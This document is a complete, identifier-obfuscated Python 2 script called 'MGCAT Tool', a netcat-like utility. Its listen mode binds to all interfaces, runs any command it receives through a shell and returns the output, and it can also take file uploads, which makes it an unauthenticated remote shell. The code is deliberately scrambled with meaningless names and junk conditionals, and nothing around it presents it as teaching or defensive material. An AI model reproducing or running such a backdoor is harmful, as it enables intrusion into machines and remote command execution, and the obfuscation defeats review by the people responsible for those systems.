#!/usr/bin/python
import sys
import os
import traceback
import socket
import getopt
import threading
import subprocess
import signal
if 40 - 40: i1I1I1i1i11 + oOO0000 - OOO00OooOOO0 . IIiI1II1iIiI
if 17 - 17: II1i1i1Ii / OO00oO + O00ooOOoOO00o
if 84 - 84: iI11I - ooO0oOoO % i1IIi1 * ii1111i1 * Oooo0OO
o000o = False
iIII11i111i = False
iiI111iIIiI = False
I1Ii1iI = ''
iI1111ii1i = ''
I1I11i11iiIii = ''
OoO = 0
if 77 - 77: IIiiiIiI + II + oO0OO00 / OOO0 % O0o0
if 22 - 22: OOOOO * I1I11i1I1I + ii1
if 71 - 71: OOOOO
if 94 - 94: i1I1I1i1i11 . OO00oO . I1I11i1I1I . oO0OO00 - IIiI1II1iIiI . iI11I
def I1ii11II1II ( ) :
 print ( '**MGCAT Tool**' )
 if 72 - 72: oO0OO00 + II1i1i1Ii . OOOOO
 if 56 - 56: i1I1I1i1i11 % IIiI1II1iIiI / I1I11i1I1I - IIiI1II1iIiI
 if 58 - 58: oO0OO00 . I1I11i1I1I % oOO0000 * II
 if 59 - 59: II + OOO00OooOOO0 - II1i1i1Ii + IIiI1II1iIiI - oO0OO00 + II1i1i1Ii
def iI1I1iIIIi1 ( arg2 ) :
 I1ii11II1II ( )
 if 36 - 36: II
 if 49 - 49: ii1111i1 / ooO0oOoO + IIiI1II1iIiI - ooO0oOoO . ooO0oOoO * OOO0
def Ooo0oo ( arg2 ) :
 global o000o
 o000o = True
 if 93 - 93: i1IIi1
 if 95 - 95: O0o0 * II1i1i1Ii
def iIIIii1 ( arg2 ) :
 global I1Ii1iI
 I1Ii1iI = arg2
 if 46 - 46: oO0OO00 - i1IIi1
 if 50 - 50: IIiI1II1iIiI / ii1111i1 / IIiiiIiI % OOO00OooOOO0 - i1IIi1 - ooO0oOoO
def Oo00oooOOO ( arg2 ) :
 global iIII11i111i
 iIII11i111i = True
 if 54 - 54: II1i1i1Ii . oO0OO00 + ooO0oOoO . i1I1I1i1i11 * OOO0
 if 50 - 50: II - II % i1I1I1i1i11
def O0ooooOoo0ooo ( arg2 ) :
 global I1I11i11iiIii
 I1I11i11iiIii = arg2
 if 58 - 58: oOO0000
 if 52 - 52: oOO0000 / oOO0000 / ii1111i1 + O00ooOOoOO00o
def ii1IIii111 ( arg2 ) :
 global iI1111ii1i
 iI1111ii1i = arg2
 if 42 - 42: O00ooOOoOO00o + ooO0oOoO / OOO00OooOOO0 / ooO0oOoO * ooO0oOoO + OOO00OooOOO0
 if 23 - 23: OOOOO - ii1111i1 % O00ooOOoOO00o
def I11i ( arg2 ) :
 global OoO
 OoO = int ( arg2 )
 if 39 - 39: oOO0000
 if 52 - 52: ooO0oOoO . ii1 + oO0OO00 . ii1 % Oooo0OO / I1I11i1I1I
def iI ( arg , arg2 ) :
 I1iIii = {
 '-h' : iI1I1iIIIi1 ,
 '-l' : Ooo0oo ,
 '-e' : iIIIii1 ,
 '-c' : Oo00oooOOO ,
 '-u' : O0ooooOoo0ooo ,
 '-t' : ii1IIii111 ,
 '-p' : I11i
 }
 if 32 - 32: O0o0 + Oooo0OO
 return I1iIii [ arg ] ( arg2 )
 if 68 - 68: OO00oO . OOOOO / oOO0000 % oOO0000
 if 100 - 100: OOO0 . OOO00OooOOO0 + I1I11i1I1I + I1I11i1I1I
def oOo ( ) :
 if 68 - 68: i1I1I1i1i11 + II
 global o000o
 global OoO
 global I1Ii1iI
 global iIII11i111i
 global I1I11i11iiIii
 global iI1111ii1i
 if 53 - 53: oOO0000 % OOO00OooOOO0
 if not len ( sys . argv [ 1 : ] ) :
  I1ii11II1II ( )
 try :
  OOOOOIi1ii11111iI , OooO00Oo00 = getopt . getopt ( sys . argv [ 1 : ] , 'hle:t:p:cu:' , [
 'help' , 'listen' , 'execute' , 'target' , 'port' , 'command' , 'upload' ] )
 except getopt . GetoptError as iIIii111 :
  print str ( iIIii111 )
  I1ii11II1II ( )
  if 57 - 57: IIiI1II1iIiI + oO0OO00 % oOO0000 * ii1111i1 * i1I1I1i1i11
 for I1Ii1I , iiII in OOOOOIi1ii11111iI :
  if 93 - 93: OOOOO / OOO0
  iI ( I1Ii1I , iiII )
  if 24 - 24: OOO00OooOOO0 + OO00oO . ii1 . i1IIi1 . ii1 + i1IIi1
 if not o000o and len ( iI1111ii1i ) and OoO > 0 :
  if 31 - 31: O00ooOOoOO00o . II - IIiI1II1iIiI
  if 6 - 6: Oooo0OO . O0o0 / iI11I * oOO0000 % oO0OO00
  O0o0OOOOo = raw_input ( '<MG:#> ' )
  if 31 - 31: IIiI1II1iIiI
  if 60 - 60: O00ooOOoOO00o
  Oo ( O0o0OOOOo )
  if 76 - 76: oO0OO00 * oOO0000 % II % oO0OO00
 if o000o :
  OooOO00ooO ( )
  if 90 - 90: OO00oO - OOO00OooOOO0 . O00ooOOoOO00o . oO0OO00 - oOO0000 + ii1
  if 59 - 59: ooO0oOoO
def Oo ( buffer ) :
 oOOoooOOOO00 = socket . socket ( socket . AF_INET , socket . SOCK_STREAM )
 try :
  oOOoooOOOO00 . connect ( ( iI1111ii1i , OoO ) )
  if ( len ( buffer ) ) :
   oOOoooOOOO00 . send ( buffer + '\n' )
  try :
   while True :
    if 50 - 50: ooO0oOoO + IIiiiIiI / ooO0oOoO . O0o0 * IIiiiIiI . OOOOO
    i1I1I1iii = 1
    OOOoO0oo0O00 = ""
    if 37 - 37: oOO0000 % OO00oO / ii1
    while i1I1I1iii :
     OoOOOo000oO0o = oOOoooOOOO00 . recv ( 4096 )
     i1I1I1iii = len ( OoOOOo000oO0o )
     OOOoO0oo0O00 += OoOOOo000oO0o
     if i1I1I1iii < 4096 :
      break
      if 73 - 73: ii1 * i1IIi1 % IIiI1II1iIiI
      if 47 - 47: O0o0
      if 8 - 8: OOO0
    print OOOoO0oo0O00
    if 75 - 75: ii1111i1 - i1IIi1 * ii1111i1 - OO00oO / OO00oO
    if 45 - 45: ii1 + O0o0 % oO0OO00 / O00ooOOoOO00o
    if 18 - 18: oO0OO00 - oOO0000 + i1I1I1i1i11 % IIiI1II1iIiI / i1I1I1i1i11
    buffer = raw_input ( '<MG:#> ' )
    oOOoooOOOO00 . send ( buffer + '\n' )
  except KeyboardInterrupt :
   print ( '\n Exiting \n' )
   if 46 - 46: ooO0oOoO . oO0OO00 + Oooo0OO
   i111i1 ( )
   oOOoooOOOO00 . close ( )
   sys . exit ( )
 except Exception as iIIii111 :
  print '[*] Exception -- Exit'
  print str ( iIIii111 )
  print ( traceback . format_exc ( ) )
  oOOoooOOOO00 . close ( )
  if 80 - 80: IIiI1II1iIiI / O00ooOOoOO00o - OO00oO
  if 70 - 70: O0o0
def i111i1 ( ) :
 print 'Killing main server process'
 oO0o = Ii111I1IIIi ( 'lsof -i' )
 print 'Searching for %s: ' % ( iI1111ii1i + ':' + str ( OoO ) )
 for iii1 in oO0o . splitlines ( ) :
  if ( iI1111ii1i + ':' + str ( OoO ) ) in iii1 :
   I1i1 = iii1 . split ( '    ' ) [ 1 ] . split ( ' ' ) [ 0 ]
   print 'killing: %s' % I1i1
   os . kill ( int ( I1i1 ) , signal . SIGKILL )
   if 99 - 99: O00ooOOoOO00o
   if 95 - 95: IIiI1II1iIiI * iI11I / O00ooOOoOO00o % iI11I / i1I1I1i1i11 . iI11I
def OooOO00ooO ( ) :
 global iI1111ii1i
 if 79 - 79: ii1 / i1I1I1i1i11 . oOO0000 . iI11I % OOOOO
 if not len ( iI1111ii1i ) :
  iI1111ii1i = "0.0.0.0"
 Ooooo000o = socket . socket ( socket . AF_INET , socket . SOCK_STREAM )
 Ooooo000o . bind ( ( iI1111ii1i , OoO ) )
 Ooooo000o . listen ( 5 )
 if 44 - 44: IIiiiIiI / OOOOO / O00ooOOoOO00o / OOO00OooOOO0 . ooO0oOoO
 while True :
  Iii1 , O0OO0o = Ooooo000o . accept ( )
  if 95 - 95: OOO00OooOOO0 + oOO0000
  o00o0o0O00O = threading . Thread ( target = oOOO , args = ( Iii1 , ) )
  o00o0o0O00O . start ( )
  if 91 - 91: OOOOO + OO00oO - oOO0000 . OOO0 / OOOOO . ii1111i1
  if 43 - 43: i1I1I1i1i11 - O0o0
def Ii111I1IIIi ( command ) :
 OO00ooo0OOo = command . rstrip ( )
 try :
  oO0o = subprocess . check_output (
 OO00ooo0OOo , stderr = subprocess . STDOUT , shell = True )
 except :
  oO0o = 'Failed execution. \r\n'
 return oO0o
 if 35 - 35: OOOOO
 if 20 - 20: I1I11i1I1I * IIiiiIiI . ii1111i1 . i1IIi1 % oOO0000 + oOO0000
def oOOO ( cli_soc ) :
 global iiI111iIIiI
 global I1Ii1iI
 global iIII11i111i
 if 50 - 50: II1i1i1Ii - II1i1i1Ii
 if len ( I1I11i11iiIii and iiI111iIIiI ) :
  if 33 - 33: OOOOO
  Ooo0OOOo00 = ""
  if 70 - 70: ii1111i1 / IIiI1II1iIiI * OOO0
  while True :
   OoOOOo000oO0o = cli_soc . recv ( 1024 )
   if 51 - 51: II1i1i1Ii * II1i1i1Ii / OOO00OooOOO0 - II / Oooo0OO / I1I11i1I1I
   if not OoOOOo000oO0o :
    break
   else :
    Ooo0OOOo00 += OoOOOo000oO0o
    if 37 - 37: ooO0oOoO % iI11I . I1I11i1I1I - O0o0
  print Ooo0OOOo00
  try :
   III = open ( I1I11i11iiIii , 'wb' )
   III . write ( Ooo0OOOo00 )
   III . close ( )
   if 4 - 4: O0o0 . oO0OO00 - O00ooOOoOO00o * IIiiiIiI / II1i1i1Ii
   cli_soc . send ( 'Successful save: %s\r\n' % I1I11i11iiIii )
  except :
   cli_soc . send ( 'Failure to save file: %s\r\n' % I1I11i11iiIii )
   if 18 - 18: OOOOO % iI11I - i1I1I1i1i11
 if ( len ( I1Ii1iI ) ) :
  if 23 - 23: oOO0000 + i1I1I1i1i11
  oO0o = Ii111I1IIIi ( I1Ii1iI )
  cli_soc . send ( oO0o )
 if iIII11i111i :
  while True :
   if 48 - 48: oO0OO00 + OOOOO
   I1I = ""
   while '\n' not in I1I :
    I1I += cli_soc . recv ( 1024 )
    if 36 - 36: OOO0 / IIiiiIiI % IIiiiIiI
   OOOoO0oo0O00 = Ii111I1IIIi ( I1I )
   cli_soc . send ( OOOoO0oo0O00 )
   if 40 - 40: i1I1I1i1i11 * OOO00OooOOO0 + ii1 - i1I1I1i1i11 / oO0OO00
   if 12 - 12: iI11I + II1i1i1Ii
oOo ( )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
